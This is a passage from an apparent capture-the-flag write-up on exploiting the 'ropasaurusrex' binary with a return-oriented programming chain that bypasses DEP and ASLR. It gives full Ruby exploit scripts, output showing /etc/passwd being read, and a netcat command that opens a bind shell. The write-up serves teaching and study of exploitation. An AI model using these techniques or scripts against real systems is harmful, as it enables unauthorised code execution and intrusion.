<span class="lnr">5 </span> <span class="Constant">80484b7</span>:       <span class="Constant">5f</span>                      <span class="Identifier">pop</span>    <span class="Identifier">edi</span>
<span class="lnr">6 </span> <span class="Constant">80484b8</span>:       <span class="Constant">5d</span>                      <span class="Identifier">pop</span>    <span class="Identifier">ebp</span>
<span class="lnr">7 </span> <span class="Constant">80484b9</span>:       <span class="Identifier">c3</span>                      <span class="Identifier">ret</span>
```

This lets us remove between 1 and 4 arguments off the stack before executing the next function. Perfect!

And remember, if you're doing this yourself, ensure that the pops are at consecutive addresses. Using <tt>egrep</tt> to find them can be a little dangerous like that.

So now, if we want a triple <tt>pop</tt> and a <tt>ret</tt> (to remove the three arguments that <tt>read()</tt> used), we want the address <tt>0x80484b6</tt>, so we set up our stack like this:

```

+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- Start of system()'s frame
|      void *arg       | - 0x08049530 (buf)
+----------------------+
|   [return address]   | - 0x44444444
+----------------------+

+----------------------+
| [address of system]  | - 0xb7ec2450
+----------------------+

+----------------------+ <-- Start of read()'s frame
|     size_t count     | - strlen(cmd)
+----------------------+
|      void *buf       | - 0x08049530 (buf)
+----------------------+
|        int fd        | - 0 (stdin)
+----------------------+
| [address of "pppr"]  | - 0x080484b6
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

We also update our exploit with a <tt>s.read()</tt> at the end, to read whatever data the remote server sends us. The current exploit now looks like:

```

<span class="lnr"> 1 </span><span class="PreProc">require</span> <span class="Special">'</span><span class="Constant">socket</span><span class="Special">'</span>
<span class="lnr"> 2 </span>
<span class="lnr"> 3 </span>s = <span class="Type">TCPSocket</span>.new(<span class="Special">"</span><span class="Constant">localhost</span><span class="Special">"</span>, <span class="Constant">4444</span>)
<span class="lnr"> 4 </span>
<span class="lnr"> 5 </span><span class="Comment"># The command we'll run</span>
<span class="lnr"> 6 </span>cmd = <span class="Identifier">ARGV</span>[<span class="Constant">0</span>] + <span class="Special">"</span><span class="Special">\0</span><span class="Special">"</span>
<span class="lnr"> 7 </span>
<span class="lnr"> 8 </span><span class="Comment"># From objdump -x</span>
<span class="lnr"> 9 </span>buf = <span class="Constant">0x08049530</span>
<span class="lnr">10 </span>
<span class="lnr">11 </span><span class="Comment"># From objdump -D ./ropasaurusrex | grep read</span>
<span class="lnr">12 </span>read_addr = <span class="Constant">0x0804832C</span>
<span class="lnr">13 </span><span class="Comment"># From objdump -D ./ropasaurusrex | grep write</span>
<span class="lnr">14 </span>write_addr = <span class="Constant">0x0804830C</span>
<span class="lnr">15 </span><span class="Comment"># From gdb, "x/x system"</span>
<span class="lnr">16 </span>system_addr = <span class="Constant">0xb7ec2450</span>
<span class="lnr">17 </span><span class="Comment"># From objdump, "pop/pop/pop/ret"</span>
<span class="lnr">18 </span>pppr_addr = <span class="Constant">0x080484b6</span>
<span class="lnr">19 </span>
<span class="lnr">20 </span><span class="Comment"># Generate the payload</span>
<span class="lnr">21 </span>payload = <span class="Special">"</span><span class="Constant">A</span><span class="Special">"</span>*<span class="Constant">140</span> +
<span class="lnr">22 </span>  [
<span class="lnr">23 </span>    <span class="Comment"># system()'s stack frame</span>
<span class="lnr">24 </span>    buf,         <span class="Comment"># writable memory (cmd buf)</span>
<span class="lnr">25 </span>    <span class="Constant">0x44444444</span>,  <span class="Comment"># system()'s return address</span>
<span class="lnr">26 </span>
<span class="lnr">27 </span>    <span class="Comment"># pop/pop/pop/ret's stack frame</span>
<span class="lnr">28 </span>    system_addr, <span class="Comment"># pop/pop/pop/ret's return address</span>
<span class="lnr">29 </span>
<span class="lnr">30 </span>    <span class="Comment"># read()'s stack frame</span>
<span class="lnr">31 </span>    cmd.length,  <span class="Comment"># number of bytes</span>
<span class="lnr">32 </span>    buf,         <span class="Comment"># writable memory (cmd buf)</span>
<span class="lnr">33 </span>    <span class="Constant">0</span>,           <span class="Comment"># stdin</span>
<span class="lnr">34 </span>    pppr_addr,   <span class="Comment"># read()'s return address</span>
<span class="lnr">35 </span>
<span class="lnr">36 </span>    read_addr <span class="Comment"># Overwrite the original return</span>
<span class="lnr">37 </span>  ].reverse.pack(<span class="Special">"</span><span class="Constant">I*</span><span class="Special">"</span>) <span class="Comment"># Convert a series of 'ints' to a string</span>
<span class="lnr">38 </span>
<span class="lnr">39 </span><span class="Comment"># Write the 'exploit' payload</span>
<span class="lnr">40 </span>s.write(payload)
<span class="lnr">41 </span>
<span class="lnr">42 </span><span class="Comment"># When our payload calls read() the first time, this is read</span>
<span class="lnr">43 </span>s.write(cmd)
<span class="lnr">44 </span>
<span class="lnr">45 </span><span class="Comment"># Read the response from the command and print it to the screen</span>
<span class="lnr">46 </span>puts(s.read)
<span class="lnr">47 </span>
<span class="lnr">48 </span><span class="Comment"># Clean up</span>
<span class="lnr">49 </span>s.close()
```

And when we run it, we get the expected result:

```

<span class="lnr">1 </span><span class="Identifier">$ ruby sploit.rb "cat /etc/passwd"</span>
<span class="lnr">2 </span><span class="Identifier">root</span><span class="Normal">:</span><span class="Special">x</span><span class="Normal">:</span><span class="Constant">0</span><span class="Normal">:</span><span class="Constant">0</span><span class="Normal">:</span><span class="Comment">root</span><span class="Normal">:</span><span class="Type">/root</span><span class="Normal">:</span><span class="Statement">/bin/bash</span>
<span class="lnr">3 </span><span class="Identifier">daemon</span><span class="Normal">:</span><span class="Special">x</span><span class="Normal">:</span><span class="Constant">1</span><span class="Normal">:</span><span class="Constant">1</span><span class="Normal">:</span><span class="Comment">daemon</span><span class="Normal">:</span><span class="Type">/usr/sbin</span><span class="Normal">:</span><span class="Statement">/bin/sh</span>
<span class="lnr">4 </span><span class="Identifier">bin</span><span class="Normal">:</span><span class="Special">x</span><span class="Normal">:</span><span class="Constant">2</span><span class="Normal">:</span><span class="Constant">2</span><span class="Normal">:</span><span class="Comment">bin</span><span class="Normal">:</span><span class="Type">/bin</span><span class="Normal">:</span><span class="Statement">/bin/sh</span>
<span class="lnr">5 </span><span class="Identifier">...</span>
```

And if you look at the [core dump](https://en.wikipedia.org/wiki/Core_dump), you'll see it's crashing at <tt>0x44444444</tt> as expected.

Done, right?

WRONG!

This exploit worked perfectly against my test machine, but when ASLR is enabled, it failed:

```

<span class="lnr">1 </span>$ sudo sysctl <span class="Special">-w</span> <span class="Identifier">kernel.randomize_va_space</span>=<span class="Constant">1</span>
<span class="lnr">2 </span>kernel.randomize_va_space <span class="Statement">=</span> <span class="Constant">1</span>
<span class="lnr">3 </span>ron@debian-x86 ~ $ ruby sploit.rb <span class="Statement">"</span><span class="Constant">cat /etc/passwd</span><span class="Statement">"</span>
```

This is where it starts to get a little more complicated. Let's go!

## What is ASLR?

ASLR—or address space layout randomization—is a defense implemented on all modern systems (except for FreeBSD) that randomizes the address that libraries are loaded at. As an example, let's run ropasaurusrex twice and get the address of <tt>system()</tt>:

```

<span class="lnr"> 1 </span>ron@debian-x86 ~ $ perl <span class="Special">-e</span> <span class="Statement">'</span><span class="Constant">printf "A"x1000</span><span class="Statement">'</span> | ./ropasaurusrex
<span class="lnr"> 2 </span>Segmentation fault <span class="PreProc">(</span><span class="Special">core dumped</span><span class="PreProc">)</span>
<span class="lnr"> 3 </span>ron@debian-x86 ~ $ gdb ./ropasaurusrex core
<span class="lnr"> 4 </span>Program terminated with signal <span class="Constant">11</span>, Segmentation fault.
<span class="lnr"> 5 </span><span class="Comment">#0  0x41414141 in ?? ()</span>
<span class="lnr"> 6 </span><span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span> x/x system
<span class="lnr"> 7 </span>0xb766e450 <span class="Statement"><</span>system<span class="Statement">></span>:    0x890cec83
<span class="lnr"> 8 </span>
<span class="lnr"> 9 </span>ron@debian-x86 ~ $ perl <span class="Special">-e</span> <span class="Statement">'</span><span class="Constant">printf "A"x1000</span><span class="Statement">'</span> | ./ropasaurusrex
<span class="lnr">10 </span>Segmentation fault <span class="PreProc">(</span><span class="Special">core dumped</span><span class="PreProc">)</span>
<span class="lnr">11 </span>ron@debian-x86 ~ $ gdb ./ropasaurusrex core
<span class="lnr">12 </span>Program terminated with signal <span class="Constant">11</span>, Segmentation fault.
<span class="lnr">13 </span><span class="Comment">#0  0x41414141 in ?? ()</span>
<span class="lnr">14 </span><span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span> x/x system
<span class="lnr">15 </span>0xb76a7450 <span class="Statement"><</span>system<span class="Statement">></span>:    0x890cec83
```

Notice that the address of <tt>system()</tt> changes from <tt>0xb766e450</tt> to <tt>0xb76a7450</tt>. That's a problem!

## Defeating ASLR

So, what do we know? Well, the binary itself isn't ASLRed, which means that we can rely on every address in it to stay put, which is useful. Most importantly, the relocation table will remain at the same address:

```

<span class="lnr"> 1 </span>$ objdump <span class="Special">-R</span> ./ropasaurusrex
<span class="lnr"> 2 </span>
<span class="lnr"> 3 </span>./ropasaurusrex:     <span class="Statement">file</span> format elf32-i386
<span class="lnr"> 4 </span>
<span class="lnr"> 5 </span>DYNAMIC RELOCATION RECORDS
<span class="lnr"> 6 </span>OFFSET   TYPE              VALUE
<span class="lnr"> 7 </span>08049600 R_386_GLOB_DAT    __gmon_start__
<span class="lnr"> 8 </span>08049610 R_386_JUMP_SLOT   __gmon_start__
<span class="lnr"> 9 </span>08049614 R_386_JUMP_SLOT   <span class="Statement">write</span>
<span class="lnr">10 </span>08049618 R_386_JUMP_SLOT   __libc_start_main
<span class="lnr">11 </span>0804961c R_386_JUMP_SLOT   <span class="Statement">read</span>
```

So we know the address—in the binary—of <tt>read()</tt> and <tt>write()</tt>. What's that mean? Let's take a look at their values while the binary is running:

```

<span class="lnr">1 </span>$ gdb ./ropasaurusrex
<span class="lnr">2 </span><span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span> run
<span class="lnr">3 </span>^C
<span class="lnr">4 </span>Program received signal SIGINT, Interrupt.
<span class="lnr">5 </span>0xb7fe2424 <span class="Error">in</span> __kernel_vsyscall <span class="PreProc">()</span>
<span class="lnr">6 </span><span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span> x/x 0x0804961c
<span class="lnr">7 </span>0x804961c:      0xb7f48110
<span class="lnr">8 </span><span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span> <span class="Statement">print</span><span class="Constant"> read</span>
<span class="lnr">9 </span><span class="PreProc">$1</span> <span class="Statement">=</span> <span class="Special">{</span><span class="Statement"><</span>text variable, no debug info<span class="Statement">></span><span class="Special">}</span> 0xb7f48110 <span class="Statement"><</span><span class="Statement">read</span><span class="Statement">></span>
```

Well look at that.. a pointer to <tt>read()</tt> at a memory address that we know! What can we do with that, I wonder...? I'll give you a hint: we can use the <tt>write()</tt> function—which we also know—to grab data from arbitrary memory and write it to the socket.

## Finally, running some code!

Okay, let's break, this down into steps. We need to:

1. Copy a command into memory using the <tt>read()</tt> function.
2. Get the address of the <tt>write()</tt> function using the <tt>write()</tt> function.
3. Calculate the offset between <tt>write()</tt> and <tt>system()</tt>, which lets us get the address of <tt>system()</tt>.
4. Call <tt>system()</tt>.

To call <tt>system()</tt>, we're gonna have to write the address of <tt>system()</tt> somewhere in memory, then call it. The easiest way to do that is to overwrite the call to <tt>read()</tt> in the <tt>.plt</tt> table, then call <tt>read()</tt>.

By now, you're probably confused. Don't worry, I was too. I was shocked I got this working. :)

Let's just go for broke now and get this working! Here's the stack frame we want:

```

+----------------------+
|         ...          |
+----------------------+

+----------------------+ <-- system()'s frame [7]
|      void *arg       | 
+----------------------+
|   [return address]   | 
+----------------------+

+----------------------+ <-- pop/pop/pop/ret's frame [6]
|  [address of read]   | - this will actually jump to system()
+----------------------+

+----------------------+ <-- second read()'s frame [5]
|     size_t count     | - 4 bytes (the size of a 32-bit address)
+----------------------+
|      void *buf       | - pointer to read() so we can overwrite it
+----------------------+
|        int fd        | - 0 (stdin)
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret's frame [4]
|  [address of read]   |
+----------------------+

+----------------------+ <-- write()'s frame [3]
|     size_t count     | - 4 bytes (the size of a 32-bit address)
+----------------------+
|      void *buf       | - The address containing a pointer to read()
+----------------------+
|        int fd        | - 1 (stdout)
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+ <-- pop/pop/pop/ret's frame [2]
|  [address of write]  |
+----------------------+

+----------------------+ <-- read()'s frame [1]
|     size_t count     | - strlen(cmd)
+----------------------+
|      void *buf       | - writeable memory
+----------------------+
|        int fd        | - 0 (stdin)
+----------------------+
| [address of "pppr"]  |
+----------------------+

+----------------------+
|         ...          |
+----------------------+
```

Holy smokes, what's going on!?

Let's start at the bottom and work our way up! I tagged each frame with a number for easy reference.

Frame \[1\] we've seen before. It writes <tt>cmd</tt> into our writable memory. Frame \[2\] is a standard <tt>pop/pop/pop/ret</tt> to clean up the <tt>read()</tt>.

Frame \[3\] uses <tt>write()</tt> to write the address of the <tt>read()</tt> function to the socket. Frame \[4\] uses a standard <tt>pop/pop/pop/ret</tt> to clean up after <tt>write()</tt>.

Frame \[5\] reads another address over the socket and writes it to memory. This address is going to be the address of the <tt>system()</tt> call. The reason writing it to memory works is because of how <tt>read()</tt> is called. Take a look at the <tt>read()</tt> call we've been using in gdb (<tt>0x0804832C</tt>) and you'll see this:

```

<span class="lnr">1 </span><span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span> x/i 0x0804832C
<span class="lnr">2 </span>0x804832c <span class="Statement"><</span><span class="Statement">read</span>@plt<span class="Statement">></span>:   jmp    DWORD PTR ds:0x804961c
```

<tt>read()</tt> is actually implemented as an indirect jump! So if we can change what <tt>ds:0x804961c</tt>'s value is, and still jump to it, then we can jump anywhere we want! So in frame \[3\] we read the address from memory (to get the actual address of <tt>read()</tt>) and in frame \[5\] we write a new address there.

Frame \[6\] is a standard <tt>pop/pop/pop/ret</tt> construct, with a small difference: the return address of the <tt>pop/pop/pop/ret</tt> is <tt>0x804832c</tt>, which is actually <tt>read()</tt>'s <tt>.plt</tt> entry. Since we overwrote <tt>read()</tt>'s <tt>.plt</tt> entry with <tt>system()</tt>, this call actually goes to <tt>system()</tt>!

## Final code

Whew! That's quite complicated. Here's code that implements the full exploit for ropasaurusrex, bypassing both DEP and ASLR:

```

<span class="lnr"> 1 </span><span class="PreProc">require</span> <span class="Special">'</span><span class="Constant">socket</span><span class="Special">'</span>
<span class="lnr"> 2 </span>
<span class="lnr"> 3 </span>s = <span class="Type">TCPSocket</span>.new(<span class="Special">"</span><span class="Constant">localhost</span><span class="Special">"</span>, <span class="Constant">4444</span>)
<span class="lnr"> 4 </span>
<span class="lnr"> 5 </span><span class="Comment"># The command we'll run</span>
<span class="lnr"> 6 </span>cmd = <span class="Identifier">ARGV</span>[<span class="Constant">0</span>] + <span class="Special">"</span><span class="Special">\0</span><span class="Special">"</span>
<span class="lnr"> 7 </span>
<span class="lnr"> 8 </span><span class="Comment"># From objdump -x</span>
<span class="lnr"> 9 </span>buf = <span class="Constant">0x08049530</span>
<span class="lnr">10 </span>
<span class="lnr">11 </span><span class="Comment"># From objdump -D ./ropasaurusrex | grep read</span>
<span class="lnr">12 </span>read_addr = <span class="Constant">0x0804832C</span>
<span class="lnr">13 </span><span class="Comment"># From objdump -D ./ropasaurusrex | grep write</span>
<span class="lnr">14 </span>write_addr = <span class="Constant">0x0804830C</span>
<span class="lnr">15 </span><span class="Comment"># From gdb, "x/x system"</span>
<span class="lnr">16 </span>system_addr = <span class="Constant">0xb7ec2450</span>
<span class="lnr">17 </span><span class="Comment"># Fram objdump, "pop/pop/pop/ret"</span>
<span class="lnr">18 </span>pppr_addr = <span class="Constant">0x080484b6</span>
<span class="lnr">19 </span>
<span class="lnr">20 </span><span class="Comment"># The location where read()'s .plt entry is</span>
<span class="lnr">21 </span>read_addr_ptr = <span class="Constant">0x0804961c</span>
<span class="lnr">22 </span>
<span class="lnr">23 </span><span class="Comment"># The difference between read() and system()</span>
<span class="lnr">24 </span><span class="Comment"># Calculated as  read (0xb7f48110) - system (0xb7ec2450)</span>
<span class="lnr">25 </span><span class="Comment"># Note: This is the one number that needs to be calculated using the</span>
<span class="lnr">26 </span><span class="Comment"># target version of libc rather than my own!</span>
<span class="lnr">27 </span>read_system_diff = <span class="Constant">0x85cc0</span>
<span class="lnr">28 </span>
<span class="lnr">29 </span><span class="Comment"># Generate the payload</span>
<span class="lnr">30 </span>payload = <span class="Special">"</span><span class="Constant">A</span><span class="Special">"</span>*<span class="Constant">140</span> +
<span class="lnr">31 </span>  [
<span class="lnr">32 </span>    <span class="Comment"># system()'s stack frame</span>
<span class="lnr">33 </span>    buf,         <span class="Comment"># writable memory (cmd buf)</span>
<span class="lnr">34 </span>    <span class="Constant">0x44444444</span>,  <span class="Comment"># system()'s return address</span>
<span class="lnr">35 </span>
<span class="lnr">36 </span>    <span class="Comment"># pop/pop/pop/ret's stack frame</span>
<span class="lnr">37 </span>    <span class="Comment"># Note that this calls read_addr, which is overwritten by a pointer</span>
<span class="lnr">38 </span>    <span class="Comment"># to system() in the previous stack frame</span>
<span class="lnr">39 </span>    read_addr,   <span class="Comment"># (this will become system())</span>
<span class="lnr">40 </span>
<span class="lnr">41 </span>    <span class="Comment"># second read()'s stack frame</span>
<span class="lnr">42 </span>    <span class="Comment"># This reads the address of system() from the socket and overwrites</span>
<span class="lnr">43 </span>    <span class="Comment"># read()'s .plt entry with it, so calls to read() end up going to</span>
<span class="lnr">44 </span>    <span class="Comment"># system()</span>
<span class="lnr">45 </span>    <span class="Constant">4</span>,           <span class="Comment"># length of an address</span>
<span class="lnr">46 </span>    read_addr_ptr, <span class="Comment"># address of read()'s .plt entry</span>
<span class="lnr">47 </span>    <span class="Constant">0</span>,           <span class="Comment"># stdin</span>
<span class="lnr">48 </span>    pppr_addr,   <span class="Comment"># read()'s return address</span>
<span class="lnr">49 </span>
<span class="lnr">50 </span>    <span class="Comment"># pop/pop/pop/ret's stack frame</span>
<span class="lnr">51 </span>    read_addr,
<span class="lnr">52 </span>
<span class="lnr">53 </span>    <span class="Comment"># write()'s stack frame</span>
<span class="lnr">54 </span>    <span class="Comment"># This frame gets the address of the read() function from the .plt</span>
<span class="lnr">55 </span>    <span class="Comment"># entry and writes to to stdout</span>
<span class="lnr">56 </span>    <span class="Constant">4</span>,           <span class="Comment"># length of an address</span>
<span class="lnr">57 </span>    read_addr_ptr, <span class="Comment"># address of read()'s .plt entry</span>
<span class="lnr">58 </span>    <span class="Constant">1</span>,           <span class="Comment"># stdout</span>
<span class="lnr">59 </span>    pppr_addr,   <span class="Comment"># retrurn address</span>
<span class="lnr">60 </span>
<span class="lnr">61 </span>    <span class="Comment"># pop/pop/pop/ret's stack frame</span>
<span class="lnr">62 </span>    write_addr,
<span class="lnr">63 </span>
<span class="lnr">64 </span>    <span class="Comment"># read()'s stack frame</span>
<span class="lnr">65 </span>    <span class="Comment"># This reads the command we want to run from the socket and puts it</span>
<span class="lnr">66 </span>    <span class="Comment"># in our writable "buf"</span>
<span class="lnr">67 </span>    cmd.length,  <span class="Comment"># number of bytes</span>
<span class="lnr">68 </span>    buf,         <span class="Comment"># writable memory (cmd buf)</span>
<span class="lnr">69 </span>    <span class="Constant">0</span>,           <span class="Comment"># stdin</span>
<span class="lnr">70 </span>    pppr_addr,   <span class="Comment"># read()'s return address</span>
<span class="lnr">71 </span>
<span class="lnr">72 </span>    read_addr <span class="Comment"># Overwrite the original return</span>
<span class="lnr">73 </span>  ].reverse.pack(<span class="Special">"</span><span class="Constant">I*</span><span class="Special">"</span>) <span class="Comment"># Convert a series of 'ints' to a string</span>
<span class="lnr">74 </span>
<span class="lnr">75 </span><span class="Comment"># Write the 'exploit' payload</span>
<span class="lnr">76 </span>s.write(payload)
<span class="lnr">77 </span>
<span class="lnr">78 </span><span class="Comment"># When our payload calls read() the first time, this is read</span>
<span class="lnr">79 </span>s.write(cmd)
<span class="lnr">80 </span>
<span class="lnr">81 </span><span class="Comment"># Get the result of the first read() call, which is the actual address of read</span>
<span class="lnr">82 </span>this_read_addr = s.read(<span class="Constant">4</span>).unpack(<span class="Special">"</span><span class="Constant">I</span><span class="Special">"</span>).first
<span class="lnr">83 </span>
<span class="lnr">84 </span><span class="Comment"># Calculate the address of system()</span>
<span class="lnr">85 </span>this_system_addr = this_read_addr - read_system_diff
<span class="lnr">86 </span>
<span class="lnr">87 </span><span class="Comment"># Write the address back, where it'll be read() into the correct place by</span>
<span class="lnr">88 </span><span class="Comment"># the second read() call</span>
<span class="lnr">89 </span>s.write([this_system_addr].pack(<span class="Special">"</span><span class="Constant">I</span><span class="Special">"</span>))
<span class="lnr">90 </span>
<span class="lnr">91 </span><span class="Comment"># Finally, read the result of the actual command</span>
<span class="lnr">92 </span>puts(s.read())
<span class="lnr">93 </span>
<span class="lnr">94 </span><span class="Comment"># Clean up</span>
<span class="lnr">95 </span>s.close()
```

And here it is in action:

```

<span class="lnr">1 </span><span class="Identifier">$ ruby sploit.rb "cat /etc/passwd"</span>
<span class="lnr">2 </span><span class="Identifier">root</span><span class="Normal">:</span><span class="Special">x</span><span class="Normal">:</span><span class="Constant">0</span><span class="Normal">:</span><span class="Constant">0</span><span class="Normal">:</span><span class="Comment">root</span><span class="Normal">:</span><span class="Type">/root</span><span class="Normal">:</span><span class="Statement">/bin/bash</span>
<span class="lnr">3 </span><span class="Identifier">daemon</span><span class="Normal">:</span><span class="Special">x</span><span class="Normal">:</span><span class="Constant">1</span><span class="Normal">:</span><span class="Constant">1</span><span class="Normal">:</span><span class="Comment">daemon</span><span class="Normal">:</span><span class="Type">/usr/sbin</span><span class="Normal">:</span><span class="Statement">/bin/sh</span>
<span class="lnr">4 </span><span class="Identifier">bin</span><span class="Normal">:</span><span class="Special">x</span><span class="Normal">:</span><span class="Constant">2</span><span class="Normal">:</span><span class="Constant">2</span><span class="Normal">:</span><span class="Comment">bin</span><span class="Normal">:</span><span class="Type">/bin</span><span class="Normal">:</span><span class="Statement">/bin/sh</span>
<span class="lnr">5 </span><span class="Identifier">sys</span><span class="Normal">:</span><span class="Special">x</span><span class="Normal">:</span><span class="Constant">3</span><span class="Normal">:</span><span class="Constant">3</span><span class="Normal">:</span><span class="Comment">sys</span><span class="Normal">:</span><span class="Type">/dev</span><span class="Normal">:</span><span class="Statement">/bin/sh</span>
<span class="lnr">6 </span><span class="Identifier">[...]</span>
```

You can, of course, change <tt>cat /etc/passwd</tt> to anything you want (including a netcat listener!)

```

<span class="lnr"> 1 </span>ron@debian-x86 ~ $ ruby sploit.rb <span class="Statement">"</span><span class="Constant">pwd</span><span class="Statement">"</span>
<span class="lnr"> 2 </span>/home/ron
<span class="lnr"> 3 </span>ron@debian-x86 ~ $ ruby sploit.rb <span class="Statement">"</span><span class="Constant">whoami</span><span class="Statement">"</span>
<span class="lnr"> 4 </span>ron
<span class="lnr"> 5 </span>ron@debian-x86 ~ $ ruby sploit.rb <span class="Statement">"</span><span class="Constant">nc -vv -l -p 5555 -e /bin/sh</span><span class="Statement">"</span> &
<span class="lnr"> 6 </span><span class="Statement">[</span><span class="Constant">1</span><span class="Statement">]</span> <span class="Constant">3015</span>
<span class="lnr"> 7 </span>ron@debian-x86 ~ $ nc <span class="Special">-vv</span> localhost <span class="Constant">5555</span>
<span class="lnr"> 8 </span>debian-x86.skullseclabs.org <span class="Statement">[</span>127.0.0.1<span class="Statement">]</span> <span class="Constant">5555</span> <span class="PreProc">(</span><span class="Special">?</span><span class="PreProc">)</span> open
<span class="lnr"> 9 </span><span class="Statement">pwd</span>
<span class="lnr">10 </span>/home/ron
<span class="lnr">11 </span>whoami
<span class="lnr">12 </span>ron
```

## Conclusion

And that's it! We just wrote a reliable, DEP/ASLR-bypassing exploit for ropasaurusrex.

Feel free to comment or contact me if you have any questions!